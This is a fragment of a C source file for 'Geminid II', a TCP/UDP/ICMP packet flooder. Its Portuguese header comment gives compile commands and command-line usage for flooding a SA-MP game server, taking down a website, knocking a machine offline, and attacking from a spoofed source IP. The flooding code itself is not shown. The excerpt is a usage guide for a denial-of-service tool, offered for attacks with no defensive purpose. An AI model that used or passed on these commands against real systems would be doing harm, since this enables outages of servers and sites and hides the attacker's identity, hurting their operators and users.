 ...
 *      % gcc g3m.c -o g3m
 *
 *      Com opção de arquivo de senhas:
 *      % gcc -DF_PASS geminid.c -o geminid
 *    
 *   
 *   Como utilizar para atacar um servidor de samp:
 *   ./g3m -h ip -I -U -T 3 ou ./g3m -h ip -I -U -T 3 -p porta,porta
 *  
 * 
 *  Como utilizar para atacar um site:
 *    ./g3m -h ip -T 3 -p 80,80
 *   
 *    
 *   Como utilizar para derrubar uma máquina:
 *    ./g3m -h ip -I -U -T 3
 *    
 *    
 *   Como utilizar para atacar por um ip fake:
 *    ./g3m -h ip-atacar -I -U -T 3 -s ip-atacado
 *
 * 
 * by Blade of chaos 
 */
...
/* Self promotion :) */
const char *banner = "Geminid II.  [TCP/UDP/ICMP Packet flooder]";
